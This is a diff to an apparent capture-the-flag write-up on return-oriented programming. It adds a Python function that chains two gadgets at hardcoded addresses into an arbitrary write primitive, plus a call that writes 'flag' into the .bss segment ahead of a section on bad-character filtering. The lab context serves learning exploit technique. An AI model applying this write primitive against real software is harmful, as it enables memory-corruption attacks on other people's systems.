@@ -51,6 +51,10 @@ The above gadget will work well; we just need to put an additional 4-byte dummy 
 
 Now, chaining our two gadgets together to create the arbitrary write primitive (python):
 ```python
+def write_what_where(data, addr):
+    if len(data) != 4:
+        raise Exception("data length must be 4")
+
     pop_esi_pop_edi_pop_ebp_ret = b'\xb9\x85\x04\x08'
     mov_dword_ptr_edi_esi       = b'\x4f\x85\x04\x08'
     deadcode = b'\xde\xc0\xad\xde'
@@ -63,6 +67,14 @@ Now, chaining our two gadgets together to create the arbitrary write primitive (
             mov_dword_ptr_edi_esi
 ```
 
+The function would then be called like this:
+```python
+# Choosing 0x0804a050 as my address; more on that later
+payload += write_what_where(b'flag', b'\x50\xa0\x04\x08')
+
+```
+
 To write `flag.txt` into memory, we will need to leverage this primitive at least two times. Once to write the first four bytes (`b'flag'`) and once for the second four (`b'.txt'`). I am in the habit of also calling it a third time, to make sure my string is null-terminated (`b'\x00'`) and then I usually write another 3 bytes just for fun, making my third call something like `b'\x00lol'`. Of note, the third call is probably not necessary in my case, as I chose to write data to the `.bss` segment, where almost the whole region of memory is full of null bytes anyways, but I have the third one in there just to be safe.
 
+## Running into the badchars filtering
 
